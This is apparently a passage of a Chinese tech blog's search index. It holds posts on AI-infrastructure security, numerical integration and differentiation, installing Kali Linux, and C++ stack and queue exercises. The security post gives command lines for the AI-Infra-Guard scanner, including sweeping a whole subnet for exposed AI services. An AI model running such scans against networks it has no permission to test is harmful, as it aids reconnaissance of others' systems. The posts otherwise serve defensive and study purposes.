缓解方案\n升级到最新版，避免开启用户系统\n ComfyUI\nComfyUI是现在最流行的Diffusion模型应用，因其丰富的插件生态和高度定制化节点闻名，常用于文生图、文生视频等领域\n\n 缓解方案\n不暴露在公网使用\n AI-Infra-Guard\n\n安全团队：“求求你们先把Ollama的鉴权打开”\n算法团队：“可是文档没说需要安全配置啊…”\n运维团队：“这框架我都没听说过，怎么扫描？”\n\nAI Infra Guard（AI Infrastructure Guard）是一个高效、轻量、易用的AI基础设施安全评估工具，专为发现和检测AI系统潜在安全风险而设计。目前已经支持检测30种AI组件、不仅支持常见的AI应用Dify、ComfyUI、Open WebUI，也支持像RAGFlow、LangChain、LLaMA-Factory等开发训练框架的漏洞检测\n# 检测本地AI组件应用./ai-infra-guard -localscan# 单个目标./ai-infra-guard -target [IP:PORT/域名] # 多个目标./ai-infra-guard -target [IP:PORT/域名] -target [IP:PORT/域名]# 扫描网段寻找AI服务  ./ai-infra-guard -target 192.168.1.0/24# 从文件读取目标扫描./ai-infra-guard -file target.txt\n","tags":["Cyber Security"]},{"title":"数值积分和数值微分","url":"/2025/01/12/%E6%95%B0%E5%80%BC%E7%A7%AF%E5%88%86%E5%92%8C%E6%95%B0%E5%80%BC%E5%BE%AE%E5%88%86/","content":" 数值积分和数值微分\n有不少情况，被积函数f(x)没有具体的解析表达式，仅仅用表格或图形给出实验观测的一些点上的函数值。对于这种情况，牛顿-莱布尼兹公式也无法应用。对于上述所举的积分值不能用牛顿-莱布尼兹公式求出的情形，就可用数值积分法，即用数值的方法求出积分的近似值。\n本章的另一个内容是数值微分。在微分学中，函数f(x)的导数是通过极限定义的。若函数以表格形式给出，或函数的表达式过于复杂时，就要用数值方法求函数的导数或微分。\n当找到一个足够精度的简单函数p(x)代替原来函数f(x)就有\n∫abf(x)dx≈∫abp(x) dx\\int_{a}^{b} f(x) dx \\approx \\int_{a}^{b} p(x) \\, dx\n∫ab​f(x)dx≈∫ab​p(x)dx\n若存在实数x1,x2,…,xn；A1,A2,…,An且存在任取f(x)∈C[a,b]，都有\n∫abf(x)dx≈∑i=1nAif(xi)\\int_{a}^{b} f(x) dx \\approx \\sum_{i=1}^{n} A_if(x_i)\n∫ab​f(x)dx≈i=1∑n​Ai​f(xi​)\n\n用容易计算面积的图形代替曲边梯形得到\n梯形公式：\n∫abf(x)dx≈b−a2[f(a)+f(b)]\\int_{a}^{b} f(x) dx \\approx \\frac{b-a}{2} [f(a) + f(b)]\n∫ab​f(x)dx≈2b−a​[f(a)+f(b)]\n左矩形公式：\n∫abf(x)dx≈f(a)(b−a)\\int_{a}^{b} f(x) dx \\approx f(a) (b-a)\n∫ab​f(x)dx≈f(a)(b−a)\n中矩形公式：\n∫abf(x)dx≈(b−a)f(a+b2)\\int_{a}^{b} f(x) dx \\approx (b-a) f\\left(\\frac{a+b}{2}\\right)\n∫ab​f(x)dx≈(b−a)f(2a+b​)\n抛物线公式（辛普森公式）：\n∫abf(x)dx≈b−a6[f(a)+4f(a+b2)+f(b)]\\int_{a}^{b} f(x) dx \\approx \\frac{b-a}{6} \\left[f(a) + 4 f\\left(\\frac{a+b}{2}\\right) + f(b)\\right]\n∫ab​f(x)dx≈6b−a​[f(a)+4f(2a+b​)+f(b)]\n余项：\nR[f]=∫abf(x)dx−∑k=0nAkf(xk)R[f] = \\int_{a}^{b} f(x) dx - \\sum_{k=0}^{n} A_k f(x_k)\nR[f]=∫ab​f(x)dx−k=0∑n​Ak​f(xk​)\n其中Ak称求积系数，也称伴随节点xk的权\n\n代数精度\n\n求积公式\n∫abf(x) dx≈∑k=0nf(xk)Ak\\int_{a}^{b} f(x) \\, dx \\approx \\sum_{k=0}^{n} f(x_k) A_k\n∫ab​f(x)dx≈k=0∑n​f(xk​)Ak​\n具有m次代数精度使该公式对于\nf(x)=1,x,x2,⋯ ,xmf(x) = 1, x, x^2,\\cdots,x^m\nf(x)=1,x,x2,⋯,xm\n或\nf(x)=a0+a1x+a2x2+⋯+amxmf(x) = a_0 + a_1 x + a_2 x^2 + \\cdots + a_m x^m\nf(x)=a0​+a1​x+a2​x2+⋯+am​xm\n均准确成立，而对于f(x)=xm+1不能准确成立\n\n举例：验证梯形公式具有1次代数精度\n∫abf(x)dx≈b−a2[f(a)+f(b)]\\int_{a}^{b} f(x) dx \\approx \\frac{b-a}{2} [f(a) + f(b)]\n∫ab​f(x)dx≈2b−a​[f(a)+f(b)]\n取f(x)=1时，\n∫abdx=b−a,b−a2(1+1)=b−a\\int_{a}^{b} dx = b - a, \\quad \\frac{b-a}{2}(1+1) = b - a\n∫ab​dx=b−a,2b−a​(1+1)=b−a\n两端相等；\n取f(x)=x时，\n∫abx dx=12(b2−a2),b−a2(a+b)=12(b2−a2)\\int_{a}^{b} x \\, dx = \\frac{1}{2}(b^2 - a^2), \\quad \\frac{b-a}{2}(a+b) = \\frac{1}{2}(b^2 - a^2)\n∫ab​xdx=21​(b2−a2),2b−a​(a+b)=21​(b2−a2)\n两端相等；\n取f(x)=x2时，\n∫abx2 dx=13(b3−a3),b−a2(a2+b2)=12(a2+b2)(b−a)\\int_{a}^{b} x^2 \\, dx = \\frac{1}{3}(b^3 - a^3), \\quad \\frac{b-a}{2}(a^2 + b^2) = \\frac{1}{2}(a^2 + b^2)(b - a)\n∫ab​x2dx=31​(b3−a3),2b−a​(a2+b2)=21​(a2+b2)(b−a)\n两端不相等，所以梯形公式只有1次代数精度。\n辛普森公式有3次代数精度\n\n 牛顿——柯特斯公式\n牛顿——柯特斯公式是积分区间上等距节点的插值求积公式\n取系数Ck=Ak/(b-a)并称之为柯特斯系数，此时求积公式\n∫abf(x) dx≈(b−a)∑k=0nCkf(a+kh)\\int_{a}^{b} f(x) \\, dx \\approx (b - a) \\sum_{k=0}^{n} C_k f(a + kh)\n∫ab​f(x)dx≈(b−a)k=0∑n​Ck​f(a+kh)\n称为牛顿——柯特斯公式\n\n柯特斯系数表：\n\n\n\n\nn\nCk\n\n\n\n\n\n\n\n\n1梯形\n1/2\n1/2\n\n\n\n\n\n2辛普森\n1/6\n2/3\n1/6\n\n\n\n\n3\n1/8\n3/8\n3/8\n1/8\n\n\n\n4柯特斯\n7/90\n16/45\n2/15\n16/45\n7/90\n\n\n\n\n用三个公式计算定积分\n∫0.51xdx\\int_{0.5}^{1} \\sqrt{x}dx\n∫0.51​x​dx\n\n梯形公式\n\n∫0.51xdx≈1−0.52(0.5+1)=0.4267767\\int_{0.5}^{1} \\sqrt{x} dx \\approx \\frac{1 - 0.5}{2} (\\sqrt{0.5} + 1) = 0.4267767\n∫0.51​x​dx≈21−0.5​(0.5​+1)=0.4267767\n\n辛普森公式\n\n∫0.51xdx≈0.56(0.5+40.75+1)=0.43093403\\int_{0.5}^{1} \\sqrt{x}dx \\approx \\frac{0.5}{6} (\\sqrt{0.5} + 4\\sqrt{0.75} + 1) = 0.43093403\n∫0.51​x​dx≈60.5​(0.5​+40.75​+1)=0.43093403\n\n柯特斯公式\n\n∫0.51x dx≈0.590(70.5+320.625+120.75+320.875+7)=0.43096407\\int_{0.5}^{1} \\sqrt{x} \\, dx \\approx \\frac{0.5}{90} (7\\sqrt{0.5} + 32\\sqrt{0.625} + 12\\sqrt{0.75} + 32\\sqrt{0.875} + 7) = 0.43096407\n∫0.51​x​dx≈900.5​(70.5​+320.625​+120.75​+320.875​+7)=0.43096407\n\n\n牛顿——柯特斯公式的代数精度\n\n当n为偶数时，牛顿——柯特斯公式有n+1次代数精度\n 余项\n\n梯形公式\n\nRT=−(b−a)312f′′(η),a≤η≤bR_T = -\\frac{(b - a)^3}{12} f''(\\eta), \\quad a \\leq \\eta \\leq b\nRT​=−12(b−a)3​f′′(η),a≤η≤b\n\n辛普森公式\n\nRS=−(b−a)52880f(4)(η),a≤η≤bR_S = -\\frac{(b - a)^5}{2880} f^{(4)}(\\eta), \\quad a \\leq \\eta \\leq b\nRS​=−2880(b−a)5​f(4)(η),a≤η≤b\n\n柯特斯公式\n\nRC=−8945(b−a4)7f(6)(η),a≤η≤bR_C = -\\frac{8}{945} \\left(\\frac{b - a}{4}\\right)^7 f^{(6)}(\\eta), \\quad a \\leq \\eta \\leq b\nRC​=−9458​(4b−a​)7f(6)(η),a≤η≤b\n 复化求积法\n将积分区间分成n等份，对每等份分别用梯形公式、辛普森公式和柯特斯公式，然后将结果加起来，作为积分的近似值\n\n复化梯形公式\n\n在子区间[xk,xk+1]上利用梯形公式则有复化梯形公式\nTn=h2[f(a)+2∑k=1n−1f(xk)+f(b)]T_n = \\frac{h}{2} \\left[ f(a) + 2 \\sum_{k=1}^{n-1} f(x_k) + f(b) \\right]\nTn​=2h​[f(a)+2k=1∑n−1​f(xk​)+f(b)]\n\n余项\n\nRT=−h312nf′′(η)=−(b−a)12h2f′′(η),a≤η≤bR_{T} = -\\frac{h^3}{12} n f''(\\eta) = -\\frac{(b-a)}{12} h^2 f''(\\eta), \\quad a \\leq \\eta \\leq b\nRT​=−12h3​nf′′(η)=−12(b−a)​h2f′′(η),a≤η≤b\n\n复化辛普森公式\n\n记子区间[xk,xk+1]的中点为xk+1/2，有复化辛普森公式\nSn=∑k=0n−1h6[f(xk)+4f(xk+12)+f(xk+1)]=h6[f(a)+4∑k=0n−1f(xk+12)+2∑k=1n−1f(xk)+f(b)]S_{n} = \\sum_{k=0}^{n-1} \\frac{h}{6} \\left[ f(x_{k}) + 4 f\\left(x_{k+\\frac{1}{2}}\\right) + f(x_{k+1}) \\right]\n= \\frac{h}{6} \\left[ f(a) + 4 \\sum_{k=0}^{n-1} f\\left(x_{k+\\frac{1}{2}}\\right) + 2 \\sum_{k=1}^{n-1} f(x_{k}) + f(b) \\right]\nSn​=k=0∑n−1​6h​[f(xk​)+4f(xk+21​​)+f(xk+1​)]=6h​[f(a)+4k=0∑n−1​f(xk+21​​)+2k=1∑n−1​f(xk​)+f(b)]\n\n为了便于编写程序，可将其改写成\nSn=h6{f(a)−f(b)+∑k=1n[4f(xk−12)+2f(xk)]}S_{n} = \\frac{h}{6} \\left\\{ f(a) - f(b) + \\sum_{k=1}^{n} \\left[ 4 f\\left(x_{k-\\frac{1}{2}}\\right) + 2 f(x_{k}) \\right] \\right\\}\nSn​=6h​{f(a)−f(b)+k=1∑n​[4f(xk−21​​)+2f(xk​)]}\n\n\n余项\n\nRS=−b−a2880h4f(4)(η),a≤η≤bR_{S} = -\\frac{b-a}{2880} h^4 f^{(4)}(\\eta), \\quad a \\leq \\eta \\leq b\nRS​=−2880b−a​h4f(4)(η),a≤η≤b\n\n复化柯特斯公式\n\n把每个子区间[xk,xk+1]四等分，内分点依次记为xk+1/4,xk+1/2,xk+3/4，有复化柯特斯公式\nCn=h90[7f(a)+32∑k=0n−1f(xk+14)+12∑k=0n−1f(xk+12)+32∑k=0n−1f(xk+34)+14∑k=1n−1f(xk)+7f(b)]C_n = \\frac{h}{90} \\left[ 7f(a) + 32 \\sum_{k=0}^{n-1} f\\left(x_{k+\\frac{1}{4}}\\right) + 12 \\sum_{k=0}^{n-1} f\\left(x_{k+\\frac{1}{2}}\\right) + 32 \\sum_{k=0}^{n-1} f\\left(x_{k+\\frac{3}{4}}\\right) + 14 \\sum_{k=1}^{n-1} f(x_k) + 7f(b) \\right]\nCn​=90h​[7f(a)+32k=0∑n−1​f(xk+41​​)+12k=0∑n−1​f(xk+21​​)+32k=0∑n−1​f(xk+43​​)+14k=1∑n−1​f(xk​)+7f(b)]\n\n余项\n\nRC=−2(b−a)945(h4)6f(6)(η),a≤η≤bR_C = -\\frac{2(b - a)}{945} \\left(\\frac{h}{4}\\right)^6 f^{(6)}(\\eta), \\quad a \\leq \\eta \\leq b\nRC​=−9452(b−a)​(4h​)6f(6)(η),a≤η≤b\n 插值求导公式\n 两点公式\n设已给出两个节点x0和x1上的函数值f(x0)和f(x1)，进行线性插值\nP(x)=x−x1x0−x1f(x0)+x−x0x1−x0f(x1)P(x) = \\frac{x - x_1}{x_0 - x_1} f(x_0) + \\frac{x - x_0}{x_1 - x_0} f(x_1)\nP(x)=x0​−x1​x−x1​​f(x0​)+x1​−x0​x−x0​​f(x1​)\n对上式两端求导，记h=x1-x0，有\n前差公式：\nf′(x0)=1h[f(x1)−f(x0)]−h2f′′(ξ)f'(x_0) = \\frac{1}{h} [f(x_1) - f(x_0)] - \\frac{h}{2} f''(\\xi)\nf′(x0​)=h1​[f(x1​)−f(x0​)]−2h​f′′(ξ)\n后差公式：\nf′(x1)=1h[f(x1)−f(x0)]+h2f′′(ξ)f'(x_1) = \\frac{1}{h} [f(x_1) - f(x_0)] + \\frac{h}{2} f''(\\xi)\nf′(x1​)=h1​[f(x1​)−f(x0​)]+2h​f′′(ξ)\n 三点公式\n设已给出三个节点x0,x1=x0+h，x2=x0+2h上的函数值，有三点公式\n\n前差公式\n\nf′(x0)≈P′(x0)=12h[−3f(x0)+4f(x1)−f(x2)]+h23f′′′(ξ)f'(x_0) \\approx P'(x_0) = \\frac{1}{2h} [-3f(x_0) + 4f(x_1) - f(x_2)]+\\frac{h^2}{3}f'''(\\xi)\nf′(x0​)≈P′(x0​)=2h1​[−3f(x0​)+4f(x1​)−f(x2​)]+3h2​f′′′(ξ)\n\n中心公式\n\nf′(x1)≈P′(x1)=12h[−f(x0)+f(x2)]−h26f′′′(ξ)f'(x_1) \\approx P'(x_1) = \\frac{1}{2h} [-f(x_0) + f(x_2)]-\\frac{h^2}{6}f'''(\\xi)\nf′(x1​)≈P′(x1​)=2h1​[−f(x0​)+f(x2​)]−6h2​f′′′(ξ)\n\n后差公式\n\nf′(x2)≈P′(x2)=12h[f(x0)−4f(x1)+3f(x2)]+h23f′′′(ξ)f'(x_2) \\approx P'(x_2) = \\frac{1}{2h} [f(x_0) - 4f(x_1) + 3f(x_2)]+\\frac{h^2}{3}f'''(\\xi)\nf′(x2​)≈P′(x2​)=2h1​[f(x0​)−4f(x1​)+3f(x2​)]+3h2​f′′′(ξ)\n其中，中心公式由于少用了一个函数值f(x1)而常被采用\n","tags":["数值分析"]},{"title":"电脑焕新——安装Kali Linux系统","url":"/2024/10/07/%E7%94%B5%E8%84%91%E7%84%95%E6%96%B0%E2%80%94%E2%80%94%E5%AE%89%E8%A3%85Kali-Linux%E7%B3%BB%E7%BB%9F/","content":" 电脑焕新——安装Kali Linux系统\n系统：kali-linux-2024.3-installer-amd64.iso\n设备：n年前的Lenovo电脑（256G存储，4G运存）、一个存储空间比较大的U盘\n\n\n方便自己进一步熟悉Linux\n自己电脑个人信息过多，不便于进行渗透测试\n\n\n 准备\n开始直接用UltraISO设置启动盘，按流程制作好后，启动电脑，狂点F12\n进入BIOS后选择U盘启动，遇到如下问题：\nFailed to load ldlinux.c32\n解决方案：更换Rufus重新制作启动盘，如下\n\n注意的点：如果U盘文件系统为NTFS则需要更改为FAT32\n\n\n 配置\n\n更改为中文\n\nsudo dpkg-reconfigure locales\n选择语言，使用空格键选中，找到zh_CN.UTF-8 UTF-8选中，后面再设置为默认语言\nreboot后系统语言更换为中文\n用户的文件夹名不要切换为中文！！！\n用户的文件夹名不要切换为中文！！！\n用户的文件夹名不要切换为中文！！！\n\n换源\n\n进入/etc/apt/sources.list，注释官方源并更换为国内源\n#官方源deb http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmwaredeb-src http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware#阿里云deb https://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src https://mirrors.aliyun.com/kali kali-rolling main non-free contrib#清华大学deb https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main non-free contribdeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main non-free contrib#中科大deb https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib\n保存后更新软件列表\napt-get update        更新本地软件包索引apt-get upgrade       升级所有已安装的软件包到最新版本，但不会改变软件包之间的依赖关系apt-get dist-upgrade  系统升级的命令。它不仅升级所有已安装的软件包到最新版本，还处理软件包依赖关系的变更apt-get clean         清理APT软件包管理器的下载缓存apt-get autoclean     更保守地清理缓存，只删除那些超过一定时间（默认是2天）没有被使用的软件包文件\n","tags":["Summary"]},{"title":"栈与队列","url":"/2025/07/31/%E6%A0%88%E4%B8%8E%E9%98%9F%E5%88%97/","content":" 栈与队列\n\n在已有的数据结构知识基础上补充\n\n 基础知识\n栈和队列是STL（C++标准库）里面的两个数据结构\n\n三个最为普遍的STL版本：\n\nHP STL其他版本的C++ STL，一般是以HP STL为蓝本实现出来的，HP STL是C++ STL的第一个实现版本，而且开放源代码\nP.J.Plauger STL由P.J.Plauger参照HP STL实现出来的，被Visual C++编译器所采用，不是开源的\nSGI STL由Silicon Graphics Computer Systems公司参照HP STL实现，被Linux的C++编译器GCC所采用，SGI STL是开源软件，源码可读性甚高\n\n\n栈提供push和pop等等接口，所有元素必须符合先进后出规则，所以栈不提供走访功能，也不提供迭代器（iterator）。不像set或者map提供迭代器iterator来遍历所有元素\n栈是以底层容器完成其所有的工作，对外提供统一的接口，底层容器是可插拔的（也就是说我们可以控制使用哪种容器来实现栈的功能）\n所以STL中栈往往不被归类为容器，而被归类为container adapter（容器适配器）\n栈的内部结构，栈的底层实现可以是vector、deque或list，主要就是数组和链表的底层实现\n\n常用的SGI STL，如果没有指定底层实现的话，默认是以deque为缺省情况下栈的底层结构\n\ndeque是一个双向队列，只需封闭一端、仅开放另一端便可实现栈的逻辑\n\nSGI STL中队列底层实现缺省情况下一样使用deque实现的\n\n\n指定vector为栈的底层实现的初始化语句\n\nstd::stack&lt;int,std::vector&lt;int&gt;&gt; third;//使用vector为底层容器的栈\n队列中先进先出的数据结构同样不允许有遍历行为，不提供迭代器，SGI STL中队列一样是以deque为缺省情况下的底部结构\n\n指定list为栈的底层实现的初始化语句\n\nstd::queue&lt;int,std::list&lt;int&gt;&gt; third;//定义以list为底层容器的队列\n所以STL队列也不被归类为容器，而被归类为container adapter（容器适配器）\n\n 用栈实现队列\n232. 用栈实现队列\n使用两个栈模拟队列——一个输入栈，一个输出栈\n动画模拟以下代码：\nqueue.push(1);queue.push(2);queue.pop();//关注点1queue.push(3);queue.push(4);queue.pop();queue.pop();//关注点2queue.pop();queue.empty();\n\n在push数据的时候，只要数据放进输入栈就好，但在pop的时候，输出栈如果为空，就把进栈数据全部导入进来，再从出栈弹出数据，如果输出栈不为空，则直接从出栈弹出数据\n进栈出栈均空则队列为空\nclass MyQueue &#123;public:    stack&lt;int&gt; stackIn;    stack&lt;int&gt; stackOut;    MyQueue() &#123;            &#125;    void push(int x) &#123;        stackIn.push(x);    &#125;        int pop() &#123;        if(stackOut.empty())&#123;            while(!stackIn.empty())&#123;                stackOut.push(stackIn.top());                stackIn.pop();            &#125;        &#125;        int result=stackOut.top();        stackOut.pop();        return result;    &#125;        int peek() &#123;//返回队列头部（front）的元素，但不移除它        int result=this-&gt;pop();        stackOut.push(result);        return result;    &#125;        bool empty() &#123;        return stackIn.empty()&amp;&amp;stackOut.empty();    &#125;&#125;;/** * Your MyQueue object will be instantiated and called as such: * MyQueue* obj = new MyQueue(); * obj-&gt;push(x); * int param_2 = obj-&gt;pop(); * int param_3 = obj-&gt;peek(); * bool param_4 = obj-&gt;empty(); */\n\n时间复杂度：O(1)\n空间复杂度：O(n)\n\n\n一定要懂得复用，功能相近的函数要抽象出来，不要大量的复制粘贴，很容易出问题！\n\n 用队列实现栈\n225. 用队列实现栈\n使用两个队列模拟栈——另一个队列用来备份\n把que1最后面的元素以外的元素都备份到que2，然后弹出最后面的元素，再把其他元素从que2导回que1\n动画模拟以下代码：\nqueue.push(1);queue.push(2);queue.pop();//关注点1queue.push(3);queue.push(4);queue.pop();//关注点2queue.pop();queue.pop();queue.empty();\n\nclass MyStack &#123;public:    queue&lt;int&gt; que1;    queue&lt;int&gt; que2;    MyStack() &#123;            &#125;        void push(int x) &#123;        que1.push(x);    &#125;        int pop() &#123;        int size=que1.size();        size--;//保留最后一个元素        while(size--)&#123;            que2.push(que1.front());            que1.pop();        &#125;        int result=que1.front();//最后一个元素即返回的值        que1.pop();        que1=que2;        while(!que2.empty())&#123;            que2.pop();        &#125;        return result;    &#125;        int top() &#123;        int size=que1.size();        size--;        while(size--)&#123;            que2.push(que1.front());            que1.pop();        &#125;        int result=que1.front();        que2.push(que1.front());//获取值后将最后一个元素加入que2以保持原结构        que1.pop();        que1=que2;        while(!que2.empty())&#123;            que2.pop();        &#125;        return result;    &#125;        bool empty() &#123;        return que1.empty();    &#125;&#125;;/** * Your MyStack object will be instantiated and called as such: * MyStack* obj = new MyStack(); * obj-&gt;push(x); * int param_2 = obj-&gt;pop(); * int param_3 = obj-&gt;top(); * bool param_4 = obj-&gt;empty(); */\n\n时间复杂度：pop为O(n)，top为O(n)，其他为O(1)\n空间复杂度：O(n)\n\n 改进\n一个队列在模拟栈弹出元素的时候只要将队列头部的元素（除了最后一个元素外）重新添加到队列尾部，此时再去弹出元素就是栈的顺序了\nclass MyStack &#123;public:    queue&lt;int&gt; que;    MyStack() &#123;            &#125;        void push(int x) &#123;        que.push(x);    &#125;        int pop() &#123;        int size=que.size();        size--;        while(size--)&#123;//队列头部元素（最后一个元素除外）重添加到队列尾部            que.push(que.front());            que.pop();        &#125;        int result=que.front();//此时弹出的元素顺序为栈的顺序        que.pop();        return result;    &#125;        int top() &#123;        int size=que.size();        size--;        while(size--)&#123;            que.push(que.front());            que.pop();        &#125;        int result=que.front();//此时获得的为栈顶元素        que.push(que.front());        que.pop();        return result;    &#125;        bool empty() &#123;        return que.empty();    &#125;&#125;;/** * Your MyStack object will be instantiated and called as such: * MyStack* obj = new MyStack(); * obj-&gt;push(x); * int param_2 = obj-&gt;pop(); * int param_3 = obj-&gt;top(); * bool param_4 = obj-&gt;empty(); */\n\n时间复杂度：pop为O(n)，top为O(n)，其他为O(1)\n空间复杂度：O(n)\n\n 有效的括号\n20. 有效的括号\n\n先分析好有哪几种不匹配的情况！！！\n\n有三种不匹配的情况：\n\n左方向的括号多余了导致不匹配\n\n\n\n括号未多余，但括号类型没有匹配上\n\n\n\n右方向的括号多余了导致不匹配\n\n\n如图：\n\n\n已经遍历完字符串，但栈不为空，说明有相应的左括号没有右括号来匹配，return false\n遍历字符串匹配过程发现栈里没有要匹配的字符，return false\n遍历字符串匹配过程栈已空，没有匹配的字符，说明有右括号没有找到相应的左括号，return false\n字符串遍历完之后，栈空，说明全部匹配，return true\n\n\n技巧：匹配左括号的时候右括号先入栈，就只需要比较当前元素和栈顶相不相等就可以了\n\nclass Solution &#123;public:    bool isValid(string s) &#123;        if(s.size()%2!=0)&#123;            return false;        &#125;        stack&lt;char&gt; stack;        for(int i=0;i&lt;s.size();i++)&#123;            if(s[i]==&#x27;(&#x27;)&#123;                stack.push(&#x27;)&#x27;);            &#125;else if(s[i]==&#x27;&#123;&#x27;)&#123;                stack.push(&#x27;&#125;&#x27;);            &#125;else if(s[i]==&#x27;[&#x27;)&#123;                stack.push(&#x27;]&#x27;);            &#125;else if(stack.empty()||stack.top()!=s[i])&#123;                return false;            &#125;else&#123;                stack.pop();            &#125;        &#125;        return stack.empty();    &#125;&#125;;\n\n时间复杂度：O(n)\n空间复杂度：O(n)\n\n 删除字符串中的所有相邻重复项\n1047. 删除字符串中的所有相邻重复项\n栈的目的就是存放遍历过的元素，当遍历当前的这个元素的时候，去栈里看是否遍历过相同数值的相邻元素，然后再去做对应的消除操作\n\n弹出剩余元素后对字符串进行得到最终的结果\nclass Solution &#123;public:    string removeDuplicates(string s) &#123;        stack&lt;char&gt; stack;        for(int i=0;i&lt;s.size();i++)&#123;            char c=s[i];            if(stack.empty()||c!=stack.top())&#123;                stack.push(c);            &#125;else&#123;                stack.pop();            &#125;        &#125;        string result=&quot;&quot;;        while(!stack.empty())&#123;            result+=stack.top();            stack.pop();        &#125;        reverse(result.begin(),result.end());        return result;    &#125;&#125;;\n\n时间复杂度：O(n)\n空间复杂度：O(n)\n\n 改进\n\n双指针法\n\nslow初始为0，如果第一个和第二个就相等了，slow–，slow这个时候变成-1，string是不能继续索引的了，那么这个时候就直接把前面的给删除掉就行。如果不这样写，就不能避免掉删除掉两个之后，又有两个相邻在一起的情况了\nclass Solution &#123;public:    string removeDuplicates(string s) &#123;        int slow=0;        for(int fast=1;fast&lt;s.size();fast++)&#123;            if(slow&lt;0||s[slow]!=s[fast])&#123;                s[++slow]=s[fast];            &#125;else&#123;                slow--;            &#125;        &#125;        s.resize(slow+1);        return s;    &#125;&#125;;\n\n时间复杂度：O(n)\n空间复杂度：O(1)\n\n\n\n字符串直接作为栈\n\nclass Solution&#123;public:    string removeDuplicates(string s)&#123;        string result;        for(char c:s)&#123;            if(result.empty()||result.back()!=c)&#123;                result.push_back(c);            &#125;else&#123;                result.pop_back();            &#125;        &#125;        return result;    &#125;&#125;;\n\n时间复杂度：O(n)\n空间复杂度：O(1)\n\n\n空间复杂度：O(1)，取决于使用的语言提供的字符串类是否提供了类似「入栈」和「出栈」的接口\n注意返回值不计入空间复杂度\n\n\n字符串\n\n\n\n头插：s.insert(s.begin(), ch);或s.insert(0, 1, ch);\n头删：s.erase(s.begin());或s.erase(0,1);\n\n\n 逆波兰表达式求值\n150. 逆波兰表达式求值\n逆波兰表达式相当于是二叉树中的后序遍历，本题中每一个子表达式得出一个结果，然后拿这个结果再进行运算，相当于相邻字符串消除的过程\n\nclass Solution &#123;public:    int evalRPN(vector&lt;string&gt;&amp; tokens) &#123;        stack&lt;long long&gt;stack;//力扣修改了后台测试数据，需要用long long        for(int i=0;i&lt;tokens.size();i++)&#123;            if(tokens[i]==&quot;+&quot;||tokens[i]==&quot;-&quot;||tokens[i]==&quot;*&quot;||tokens[i]==&quot;/&quot;)&#123;                long long num1=stack.top();                stack.pop();                long long num2=stack.top();                stack.pop();                if(tokens[i]==&quot;+&quot;)&#123;                    stack.push(num2+num1);                &#125;                if(tokens[i]==&quot;-&quot;)&#123;                    stack.push(num2-num1);                &#125;                if(tokens[i]==&quot;*&quot;)&#123;                    stack.push(num2*num1);                &#125;                if(tokens[i]==&quot;/&quot;)&#123;                    stack.push(num2/num1);                &#125;            &#125;else&#123;                stack.push(stoll(tokens[i]));            &#125;        &#125;        long long result=stack.top();        return result;    &#125;&#125;;\n\n时间复杂度：O(n)\n空间复杂度：O(n)\n\n\nstoll()：string to long long。作用是把一个字符串（std::string或C-style string）转换成一个long long类型的整数\nstring s=&quot;12345&quot;;long long num=stoll(s);//num=12345\n\n 滑动窗口最大值\n239. 滑动窗口最大值\n 单调队列\n\n如何求一个区间里的最大值？\n\n暴力遍历一遍的过程中每次从窗口中再找到最大的数值，显然是O(n×k)的算法\n\n如果用一个大顶堆（优先队列）来存放这个窗口里的k个数字，这样就可以知道最大的最大值是多少了，但问题是这个窗口是移动的，而大顶堆每次只能弹出最大值，无法移除其他数值，造成大顶堆维护的不是滑动窗口里面的数值了，所以不能用大顶堆\n\n堆\n\n\n此时需要一个队列放进去窗口里的元素，随着窗口的移动队列也一进一出，每次移动之后队列告诉我们里面的最大值\nclass MyQueue&#123;public:    void pop(int value)&#123;    &#125;    void push(int value)&#123;    &#125;    int front()&#123;        return que.front();    &#125;&#125;;\n每次窗口移动的时候，调用que.pop（滑动窗口中移除元素的数值），que.push（滑动窗口添加元素的数值），然后que.front()就返回我们要的最大值\n\n已经排序之后的队列怎么能把窗口要移除的元素（这个元素可不一定是最大值）弹出呢？\n\n只需要维护有可能成为窗口里最大值的元素就可以了，同时保证队列里的元素数值是由大到小的\n那么这个维护元素单调递减的队列就叫做单调队列，即单调递减或单调递增的队列\n\n单调队列维护队列里的元素过程\n\n\n设计单调队列的时候pop和push操作保持如下规则：\n\npop(value)：如果窗口移除的元素value等于单调队列的出口元素，那么队列弹出元素，否则不用任何操作\npush(value)：如果push的元素value大于入口元素的数值，那么就将队列入口的元素弹出，直到push元素的数值小于等于队列入口元素的数值为止\n\n每次窗口移动的时候，只要访问que.front()就可以返回当前窗口的最大值\n\n基于以上规则可实现如下queue代码：\nclass MyQueue&#123;//单调队列（从大到小）public:    //使用deque来实现单调队列（queue在没有指定容器的情况下，deque就是默认底层容器）    deque&lt;int&gt; queue;    //每次弹出时比较当前要弹出数值是否等于队列出口元素数值，相等则弹出，同时pop之前判断队列当前是否为空    void pop(int value)&#123;        if(!queue.empty()&amp;&amp;value==queue.front())&#123;            queue.pop_front();        &#125;    &#125;    //push数值大于入口元素数值，将队列后端数值弹出，直到push的数值小于等于队列入口元素的数值，这样可保持队列里数值单调从大到小    void push(int value)&#123;        while(!queue.empty()&amp;&amp;value&gt;queue.back())&#123;            queue.pop_back();        &#125;        queue.push_back(value);    &#125;    //查询当前队列里的最大值，直接返回队列front即可    int front()&#123;        return queue.front();    &#125;&#125;;\n\ndeque是可以两边扩展的，而且deque里元素并不是严格的连续分布的\n\n\n题目代码\n\nclass Solution &#123;private:    class MyQueue&#123;    public:        deque&lt;int&gt; queue;        void pop(int value)&#123;            if(!queue.empty()&amp;&amp;value==queue.front())&#123;                queue.pop_front();            &#125;        &#125;        void push(int value)&#123;            while(!queue.empty()&amp;&amp;value&gt;queue.back())&#123;                queue.pop_back();            &#125;            queue.push_back(value);        &#125;        int front()&#123;            return queue.front();        &#125;    &#125;;public:    vector&lt;int&gt; maxSlidingWindow(vector&lt;int&gt;&amp; nums, int k) &#123;        MyQueue queue;        vector&lt;int&gt; result;        for(int i=0;i&lt;k;i++)&#123;            queue.push(nums[i]);        &#125;        result.push_back(queue.front());        for(int i=k;i&lt;nums.size();i++)&#123;            queue.pop(nums[i-k]);            queue.push(nums[i]);            result.push_back(queue.front());        &#125;        return result;    &#125;&#125;;\n\n时间复杂度：O(n)\n空间复杂度：O(k)\n\n 